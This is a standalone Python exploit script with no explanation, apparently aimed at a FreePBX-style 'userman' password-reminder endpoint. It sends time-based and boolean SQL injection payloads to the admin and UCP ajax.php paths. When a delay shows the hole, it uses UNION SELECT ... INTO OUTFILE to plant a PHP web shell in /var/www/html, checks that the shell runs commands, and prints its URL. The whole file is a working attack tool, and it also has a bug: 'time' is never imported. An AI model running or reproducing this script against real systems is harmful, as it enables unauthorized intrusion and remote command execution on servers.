import requests
import sys
import random
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def mane(t):
    target = t.rstrip('/')
    session = requests.Session()
    session.verify = False
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    # FREE SIPS BABY
    bullshit = [
        "username=admin' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- &password=test&loginpanel=admin",
        "username=admin' AND (SELECT 1 FROM (SELECT SLEEP(5))a)# &password=test&loginpanel=admin",
        "username=admin' OR SLEEP(5)-- &password=test&loginpanel=admin",
        "username=admin' XOR SLEEP(5)-- &password=test&loginpanel=admin",
        "username=admin' UNION SELECT SLEEP(5)-- &password=test&loginpanel=admin",
        "username=admin' AND IF(1=1,SLEEP(5),0)-- &password=test&loginpanel=admin",        
        "username=admin' AND '1'='1&password=test&loginpanel=admin",
        "username=admin' OR '1'='1'-- &password=test&loginpanel=admin",
        "username=admin' AND 1=1-- &password=test&loginpanel=admin",
        "username=admin' OR 1=1-- &password=test&loginpanel=admin",
    ]
    
    for x in ['/admin/ajax.php?module=userman&command=checkPasswordReminder', '/ucp/ajax.php?module=userman&command=checkPasswordReminder']:
        url = f"{target}{x}"
        for p in bullshit:
            try:
                start = time.time()
                session.post(url, data=p, headers=headers, timeout=10)
                if time.time()-start >= 5:
                    print(f"+ found {url}")
                    
                    shellname = f"buttcheek{random.randint(1000,9999)}.php"
                    path = f"/var/www/html/{shellname}"
                    contents = f"username=test' UNION SELECT '<?php system($_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '{path}'-- -"
                    
                    session.post(url, data=contents, headers=headers)
                    
                    check = session.get(f"{target}/{shellname}?cmd=echo%20roflrofl", timeout=5)
                    if "roflrofl" in check.text:
                        print(f"+ shell @ {target}/{shellname}?cmd=ls")
                        return True
            except:
                continue
    return False

if __name__ == '__main__':
    if len(sys.argv) != 2:
        sys.exit(1)
        
    if mane(sys.argv[1]):
        print("+ ok")
    else:
        print("fuck")